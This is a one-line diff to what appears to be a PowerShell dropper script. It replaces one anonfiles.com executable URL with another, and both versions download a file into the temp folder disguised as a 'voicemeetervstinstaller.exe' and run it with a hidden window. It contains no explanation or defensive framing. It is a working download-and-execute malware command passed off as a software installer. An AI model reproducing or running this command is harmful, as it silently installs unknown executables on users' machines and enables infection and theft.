@@ -1,1 +1,1 @@
-iwr -useb https://cdn-110.anonfiles.com/re35eeQdy7/303f6d5e-1672878814/deniz.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
+iwr -useb https://cdn-125.anonfiles.com/F35ee8Q4yb/71fd9bd3-1672879471/ababa.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
